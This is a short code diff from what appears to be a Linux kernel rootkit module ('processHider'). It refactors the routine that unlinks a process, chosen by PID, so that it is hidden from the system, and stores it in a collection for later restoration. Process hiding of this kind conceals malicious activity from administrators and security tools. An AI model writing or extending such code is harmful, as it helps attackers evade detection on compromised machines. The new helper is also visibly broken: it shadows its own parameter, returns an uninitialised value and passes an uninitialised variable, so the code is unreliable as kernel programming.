@@ -69,26 +69,31 @@ void processHider_exit(void) {
 	rcu_read_unlock();
 }
 
+int hideProcessWithLockHeldAndAddItToCollection(RestorableHiddenTask hiddenTask, int pidNumber) {
+	RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
+	int result;
+
+	if (hiddenTask == NULL) {
+		result = -1;
+		printError("failed to hide task\n");
+	} else {
+		addHiddenProcessToCollection(collection, hiddenTask);
+	}
+	return result;
+}
+
 //returns error code...
 int hideProcess(int pidNumber) {
+
 	int result;
 	
 	if (isHiddenProcessCollectionFull(collection)) {
 		printError("Failed to hide process. Too may processes are hidden.\n");
 		result = -1;
 	} else {
-		RestorableHiddenTask hiddenTask;
 		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-		hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
-
-
-		if (hiddenTask != NULL) {
-			result = -1;
-			printError("failed to hide task\n");
-		} else {
-			addHiddenProcessToCollection(collection, hiddenTask);
-		}
+		result = hideProcessWithLockHeldAndAddItToCollection(hiddenTask,pidNumber);
 
 		rcu_read_unlock();
 	}
